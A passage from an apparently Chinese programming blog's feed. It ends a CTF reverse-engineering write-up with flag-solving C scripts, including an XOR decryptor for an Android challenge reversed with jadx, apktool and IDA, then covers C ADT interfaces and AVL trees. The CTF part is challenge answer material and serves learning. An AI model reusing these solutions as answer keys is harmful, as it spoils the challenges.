&#125;</span></span><br><span class="line"><span class="comment">  puts(&quot;congratulation&quot;);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据matrix矩阵求出的flag矩阵</span></span><br><span class="line">    <span class="comment">// flag为matrix矩阵模32下的逆阵</span></span><br><span class="line">    <span class="comment">// 参考https://www.cnblogs.com/lcbwwy/p/13125084.html</span></span><br><span class="line">    <span class="comment">// https://www.cnblogs.com/Higgerw/p/14464825.html#:~:text=%E6%A8%A1%E6%84%8F%E4%B9%89%E4%B8%8B%E7%9A%84%E9%80%86%E7%9F%A9%E9%98%B5%E8%AE%A1%E7%AE%97%20%E5%8F%82%E8%80%83%E8%87%AA%20https%3A%2F%2Fwww.cnblogs.com%2Flcbwwy%2Fp%2F13125084.html%20%E6%9C%80%E8%BF%91%E5%A4%8D%E4%B9%A0%E5%88%B0Hill%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%EF%BC%8C%E6%B3%A8%E6%84%8F%E5%88%B0%E8%A7%A3%E5%AF%86%E6%A0%B8%E5%BF%83%E6%98%AF%E5%8F%AF%E9%80%86%E7%9A%84%E5%8A%A0%E5%AF%86%E7%9F%A9%E9%98%B5%20K%20K%20%E7%9A%84%E6%A8%A126%E6%84%8F%E4%B9%89%E4%B8%8B%E7%9A%84%E6%B1%82%E9%80%86%20K%E2%88%921,%EF%BC%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%AE%A1%E7%AE%97%E5%85%B6%E5%85%B3%E4%BA%8E26%E7%9A%84%E6%A8%A1%E9%80%86%20%7CK%7C%E2%88%921%20%7C%20K%20%7C%20%E2%88%92%201%20%E3%80%82</span></span><br><span class="line">    <span class="comment">// 利用网站https://zh.planetcalc.com/3324/</span></span><br><span class="line">    <span class="type">int</span> flag[<span class="number">5</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">            <span class="number">11</span>, <span class="number">19</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">12</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">16</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">29</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">27</span>, <span class="number">29</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">16</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> table[] = <span class="string">&quot;01234_asdzxcpoityumnbAOZWXGMY&quot;</span>;</span><br><span class="line">    <span class="type">int</span> number[] = &#123;</span><br><span class="line">            <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 输出方阵</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">30</span>; k &lt;= <span class="number">127</span>; ++k) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="built_in">strlen</span>(table); ++t) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (table[t] == k) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (flag[i][j] == number[t]) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, k);</span><br><span class="line">                            index++;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// putchar(&#x27;\n&#x27;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="砍树">砍树</h2><p>安卓逆向,其实不难.</p><p>赛后很久后才写WP,没环境了,解题思路在解密脚本里了…</p><p>(路径parent_directory是我的个人隐私~doge)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * jadx中分析发现,加密方法public static native int I0o0I(String str, String str2);</span></span><br><span class="line"><span class="comment"> * 为 native 方法,所以需要去找对应的.so库</span></span><br><span class="line"><span class="comment"> * 使用`apktool.bat d 砍树.apk`命令进行反编译,在文件夹</span></span><br><span class="line"><span class="comment"> * parent_directory\砍树\lib\arm64-v8a</span></span><br><span class="line"><span class="comment"> * 中找到libezreeeee.so文件,使用IDA进行分析,最终发现使用key进行异或</span></span><br><span class="line"><span class="comment"> * 编写解密脚本即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">0</span>, <span class="number">32</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">27</span>, <span class="number">54</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">38</span>, <span class="number">23</span>,</span><br><span class="line">                    <span class="number">4</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">7</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">82</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">15</span>,</span><br><span class="line">                    <span class="number">58</span>, <span class="number">39</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">70</span>, <span class="number">23</span>, <span class="number">61</span>, <span class="number">10</span>,</span><br><span class="line">                    <span class="number">60</span>, <span class="number">56</span>, <span class="number">46</span>, <span class="number">34</span>, <span class="number">24</span>, <span class="number">0</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;Sycloverforerver&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; ++i) &#123;</span><br><span class="line">        enc[i] ^= key[i % <span class="number">7</span>];</span><br><span class="line">        <span class="built_in">putchar</span>(enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现ADT接口的思想</title>
      <link href="/2023cf55e59ac2f9/"/>
      <url>/2023cf55e59ac2f9/</url>
      
        <content type="html"><![CDATA[<h1 id="创建adt对象的接口">创建ADT对象的接口</h1><p>有2种方法和一种不好的方法</p><h2 id="主调函数传递二级指针">主调函数传递二级指针</h2><p>假设我们有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;ADT_TYPE;</span><br></pre></td></tr></table></figure><p>想要在main()函数中创建一个ADT_TYPE类型的对象,那么可以这样实现接口:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create_ADT_TYPE</span><span class="params">(ADT_TYPE** objp)</span>&#123;</span><br><span class="line">    ADT_TYPE *temp = (ADT_TYPE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ADT_TYPE)); <span class="comment">// malloc</span></span><br><span class="line">    <span class="comment">// init ADT object</span></span><br><span class="line">    *objp = temp; <span class="comment">// Point *objp to temp</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    ADT_TYPE * obj;</span><br><span class="line">    create_ADT_TYPE(&amp;obj);</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    free_ADT_TYPE(obj);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main()调用create_ADT_TYPE()时传递obj的指针,也就是一个二级指针,以达到在create_ADT_TYPE()直接修改obj指向的目的.</p><h2 id="接口函数返回对象指针">接口函数返回对象指针</h2><p>同样假设有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;ADT_TYPE;</span><br></pre></td></tr></table></figure><p>想要在main()函数中创建一个ADT_TYPE类型的对象,那么可以这样实现接口:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ADT_TYPE* <span class="title function_">create_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    ADT_TYPE *temp = (ADT_TYPE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ADT_TYPE)); <span class="comment">// malloc</span></span><br><span class="line">    <span class="comment">// init ADT object</span></span><br><span class="line">   <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    ADT_TYPE * obj;</span><br><span class="line">    obj = create_ADT_TYPE();</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    free_ADT_TYPE(obj);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="全局静态指针">全局静态指针</h2><p>这样的写法很不好,这意味着一个程序只能创建一个ADT_TYPE的对象.</p><p>在ADT_TYPE.h中如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;ADT_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>在ADT_TYPE.c中有如下实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> ADT_TYPE* glob_obj;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    glob_obj = (ADT_TYPE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ADT_TYPE)); <span class="comment">// malloc</span></span><br><span class="line">    <span class="comment">// init ADT object</span></span><br><span class="line">    <span class="comment">// But directly manipulate the global static glob_obj variable</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_ADT_TYPE</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    <span class="built_in">free</span>(glob_obj);</span><br><span class="line">    glob_obj = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main.c中如下使用该ADT:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ADT_TYPE.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    create_ADT_TYPE();</span><br><span class="line">    <span class="comment">// other operations</span></span><br><span class="line">    free_ADT_TYPE();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写,用户代码(main()函数)仅仅只能依靠接口函数进行沟通,而且如果没有特殊的处理,最多只能创建一个对象,即glob_obj指向的对象.</p><h1 id="需要返回复合结果的操作接口">需要返回复合结果的操作接口</h1>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> ADT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AVL树</title>
      <link href="/2023ee62b523ba19/"/>
      <url>/2023ee62b523ba19/</url>
      
        <content type="html"><![CDATA[<h1 id="avl树概述">AVL树概述</h1><p>AVL树(<code>Adelson-Velsky and Landis Tree</code>),得名与其发明者<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%A5%A5%E5%B0%94%E5%90%89%C2%B7%E9%98%BF%E6%9D%B0%E5%B0%94%E6%9D%BE-%E9%9F%A6%E5%88%A9%E6%96%AF%E5%9F%BA">G. M. Adelson-Velsky</a>和<a href="https://zh.wikipedia.org/w/index.php?title=Evgenii_Landis&amp;action=edit&amp;redlink=1">Evgenii Landis</a>,是最早被发明的<code>自平衡二叉查找树</code>.在AVL树中，任一节点对应的两棵子树的最大高度差为1，因此它也被称为<code>高度平衡树</code>.</p><p>由于一般的二叉查找树,在极端情况下会退化成类似线性链表的结构,即变成一颗<code>左斜树</code>或<code>右斜树</code>,如图:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201100107250.png" alt="image-20231201100107250" style="zoom:50%;" /><p>查找时间复杂度降低为O(n).使用<code>平衡树</code>可以解决这个问题,<code>AVL树</code>就是一种平衡树,其满足以下的几种性质:</p><ol><li>AVL树本身是一棵二叉搜索树</li><li>每一棵子树都是AVL树</li><li>平衡条件:每个节点的左右子树的高度之差(<code>平衡因子</code>)的绝对值不超过1,即平衡因子为1,0,-1的节点认为是平衡的.换句话说,任意节点的左右子树的最大高度之差为1.</li><li>查找、插入和删除在平均和最坏情况下的时间复杂度都是<code>O(logn)</code></li></ol><h1 id="前置知识">前置知识</h1><h2 id="树的旋转">树的旋转</h2><p>树的<code>旋转</code>用于调整子树的位置.</p><p>左(右)旋可以将根节点的左(右)子树移动到根的位置,将根节点&quot;旋转&quot;到原来左(右)子树的位置.</p><h3 id="旋转约定">旋转约定</h3><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201103618570.png" alt="image-20231201103618570" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201103815425.png" alt="image-20231201103815425" style="zoom:50%;" /><h3 id="旋转伪代码">旋转伪代码</h3><p><code>旋转</code>前后仍然满足是一棵二叉搜索树,因此可以写出旋转的伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span>&#123;</span></span><br><span class="line">    AVLNode *left,*right;</span><br><span class="line">    <span class="comment">// 其他成员</span></span><br><span class="line">&#125;AVLNode;</span><br><span class="line">AVLNode *<span class="title function_">right_rotate</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="comment">// 三步操作</span></span><br><span class="line">    <span class="comment">// 注意left的右子树的位置变化</span></span><br><span class="line">    AVLNode *left = node-&gt;left;</span><br><span class="line">    node-&gt;left = left-&gt;right;</span><br><span class="line">    left-&gt;right = node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line">AVLNode *<span class="title function_">left_rotate</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="comment">// 三步操作</span></span><br><span class="line">    <span class="comment">// 注意right的左子树的位置变化</span></span><br><span class="line">    AVLNode *right = node-&gt;right;</span><br><span class="line">    node-&gt;right = right-&gt;left;</span><br><span class="line">    right-&gt;left = node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果简单地将左(右)子节点移动到根,那么从图形上看会发现该节点的孩子变成了3个(原来的左右节点和移动后的根节点),此时就需要将其中一个子树(左旋为左子树,右旋为右子树)移动为根节点(此时已经不是树根)的孩子(左旋为其右子树,右旋为其左子树)</p><p>树的<code>旋转</code>可以调整左右子树的高度,可以将高度较小的子树下移,高度较大的子树上移.在平衡树中,用于调整(减小)左右子树的高度差.</p><h1 id="实现原理">实现原理</h1><h2 id="需要实现的操作">需要实现的操作</h2><p>实现一颗二叉平衡树需要实现如下操作:</p><ol><li>树的<code>左旋</code>和<code>右旋</code></li><li>向树中插入一个节点,并根据不同情况调整平衡</li><li>从树中删除一个节点,并根据不同情况调整平衡</li></ol><h2 id="什么时候需要旋转">什么时候需要旋转</h2><p>当树的节点发生了变化,即发生了插入或删除时,需要检查此时整个树是否仍然<code>平衡</code>,即左右子树高度差不超过1.</p><p>例如新增了一个节点7:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231201110219614.png" alt="image-20231201110219614" style="zoom:50%;" /><p>这说明插入/删除节点可能(不是一定)会导致树不再平衡,此时需要进行特定的<code>旋转</code>来重新平衡,当然,无论旋转与否,这棵树都是一棵合法的<code>二叉搜索树</code>,只不过不一定平衡而已.</p><p>下面讨论插入和删除的不同情况该如何旋转.</p><h2 id="avl树的插入操作">AVL树的插入操作</h2><p>首先会按照常规<code>二叉搜索树</code>的插入操作插入一个节点,然后从这个节点进行回溯,对每个回溯路径上的点判断其左右子树是否平衡,如果不平衡,即高度之差超过1,就要进行调整.</p><p>设当前的根节点为X,其左右孩子为XL,XR.XL和XR的子树依次为T1,T2,T3…</p><p>插入节点S后有如下4种情况需要进行旋转:</p><ol><li><p>X的左子树的高度比右子树大2,且S在XL的左子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202105505144.png" alt="image-20231202105505144" style="zoom:50%;" /></li><li><p>X的右子树的高度比左子树大2,且S在XR的右子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202110359679.png" alt="image-20231202110359679" style="zoom:50%;" /></li><li><p>X的左子树比右子树大2,且S在XL的右子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202112334732.png" alt="image-20231202112334732" style="zoom:50%;" /></li><li><p>X右子树比左子树大2,且S在XR的左子树上:</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231202113619240.png" alt="image-20231202113619240" style="zoom:50%;" /></li></ol><p>以上4种情况中,1和2,3和4为左右对称的情况,仅仅是一个镜像.</p><p>读者需要自己尝试试验,或去考虑为什么需要这样旋转,总之,在代码中要分情况讨论,选择对应的旋转操作.</p><p>当然,如果高度差不超过1,则不需要进行任何旋转.</p><h2 id="avl树的删除操作">AVL树的删除操作</h2><p>插入(可能)会增加某棵子树的高度,而删除相反,相同的是,两种操作都可能影响高度差大于1,导致需要旋转调整.</p><p>同样,从删除后的节点进行回溯,按照上面的4中情况进行对应调整即可.</p><br><p>可以将要删除的节点不断向下旋转到叶子结点,最后删除该叶子节点.</p><br><p>另一种方法时,如果找到了删除节点S,有如下3种情况:</p><ol><li><p>S既有左子树,又有右子树.</p><p>找到右子树中最小的节点S2,用S2覆盖S,然后<code>递归</code>到右子树,这时问题转移为&quot;删除右子树中S2节点&quot;.</p><p>回溯回来后,要检查S(此时S的key已经被S2的key覆盖)的左右子树是否平衡,分情况选择是否旋转调整.</p></li><li><p>S只有左子树.</p><p>简单地把S删除,用S的左孩子(的指针)替换S(S的父亲的孩子指针)即可,即删除S这个树根.</p></li><li><p>S只有右子树.</p><p>简单地把S删除,用S的右孩子(的指针)替换S(S的父亲的孩子指针)即可,即删除S这个树根.</p></li></ol><p>注意上面的情况2,3可能是从情况1递归下来的,所以如果需要旋转调整,会返回到递归的上一层进行处理,即<code>回溯</code>.</p><p>另一方面,如果尚未找到,那么简单地作为<code>二叉搜索树</code>进行递归查找即可,回溯后进行(可能需要的)旋转调整.</p><h1 id="代码实现">代码实现</h1><p>本代码使用C语言编写.</p><p>头文件<code>AVLTree.h</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/12/9.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ADT_AVLTREE_AVLTREE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADT_AVLTREE_AVLTREE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> <span class="keyword">error</span> -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> status int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> &#123;</span></span><br><span class="line">    ElementType data;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AVLNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125; AVLNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    AVLNode *root;</span><br><span class="line">    <span class="comment">// int (*compare)(ElementType*, ElementType*); // 需要注册的比较函数</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125; AVLTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">// default compare function</span></span><br><span class="line"><span class="comment">// int defaultCompare(ElementType *a, ElementType *b);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create and destroy</span></span><br><span class="line"><span class="comment">// AVLTree *AVLTreeCreate(int (*compare)(ElementType*, ElementType*));</span></span><br><span class="line">AVLTree *<span class="title function_">AVLTreeCreate</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroy</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroyRun</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insert and delete</span></span><br><span class="line">status <span class="title function_">AVLTreeInsert</span><span class="params">(AVLTree *tree, ElementType data)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeInsertRun</span><span class="params">(AVLNode **root, ElementType data)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeDelete</span><span class="params">(AVLTree *tree, ElementType data)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeDeleteRun</span><span class="params">(AVLNode **root, ElementType data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// search</span></span><br><span class="line">status <span class="title function_">AVLTreeSearch</span><span class="params">(AVLTree *tree, ElementType data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get max and min</span></span><br><span class="line">status <span class="title function_">AVLTreeGetMax</span><span class="params">(AVLTree *tree, ElementType *result)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeGetMin</span><span class="params">(AVLTree *tree, ElementType *result)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get status</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetHeight</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">GetNodeHeight</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetSize</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line">status <span class="title function_">AVLTreeIsEmpty</span><span class="params">(AVLTree *tree)</span>;</span><br><span class="line">ElementType <span class="title function_">GetNodeMin</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line">ElementType <span class="title function_">GetNodeMax</span><span class="params">(AVLNode *node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rotate</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LeftRotation</span><span class="params">(AVLNode **node)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">RightRotation</span><span class="params">(AVLNode 